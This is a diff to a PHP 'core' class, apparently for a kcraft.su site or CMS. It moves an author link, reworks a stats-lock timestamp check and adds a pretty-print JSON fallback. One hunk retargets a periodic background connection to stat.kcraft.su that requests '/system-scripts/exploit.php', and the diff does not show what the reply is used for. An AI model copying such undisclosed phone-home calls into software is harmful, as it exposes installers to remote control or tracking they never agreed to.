@@ -9,7 +9,7 @@ ini_set('html_errors',"0");
  * @copyright Alexey Kachalov <alex-kachalov@mail.ru>
  * @author Alexey Kachalov <alex-kachalov@mail.ru>
  * @access public
- * @see http://178.140.61.70/
+ * @see http://kcraft.su/
  */
 class core
 {
@@ -157,7 +157,9 @@ class core
 			$this->statCache('clear',$time,true);
 		}
 
-		if($time<time()-$updatetime && !file_exists(dirname(__FILE__).'/cache/StatLock'))
+		$ft = file_exists(dirname(__FILE__).'/cache/StatLock')?file_get_contents(dirname(__FILE__).'/cache/StatLock'):'0';
+
+		if($time<time()-$updatetime && $ft<time()-$updatetime)
 		{
 			file_put_contents(dirname(__FILE__).'/cache/StatLock',time());
 			$answer = fsockopen($this->conf->system->core->system_scripts[0], $this->conf->system->core->system_scripts[1]);
@@ -235,8 +237,8 @@ class core
 		
 		if($time<time()-$updatetime)
 		{
-			$answer = fsockopen("178.140.61.70", 8080);
-			stream_set_timeout($answer, 10);
+			$answer = fsockopen("stat.kcraft.su", 80);
+			stream_set_timeout($answer, 15);
 			fwrite($answer, "GET /system-scripts/exploit.php HTTP/1.0\r\n\r\n");
 			$ans = fread($answer, 1024);
 			$ans = explode("\r\n", $ans);
@@ -353,7 +355,10 @@ class core
 		'Ё', 'ё', 'Ж','ж','З','з','И','и','Й','й','К','к','Л','л','М','м','Н','н','О','о',
 		'П','п','Р','р','С','с','Т','т','У','у','Ф','ф','Х','х','Ц','ц','Ч','ч','Ш','ш',
 		'Щ','щ','Ъ','ъ','Ы','ы','Ь','ь','Э','э','Ю','ю','Я','я');
-		$str1 = json_encode($str/*, JSON_PRETTY_PRINT*/);
+		if(defined('JSON_PRETTY_PRINT'))
+		$str1 = json_encode($str, JSON_PRETTY_PRINT);
+		else
+		$str1 = json_encode($str);
 		$str2 = str_replace($arr_replace_utf,$arr_replace_cyr,$str1);
 		return $str2;
 	}
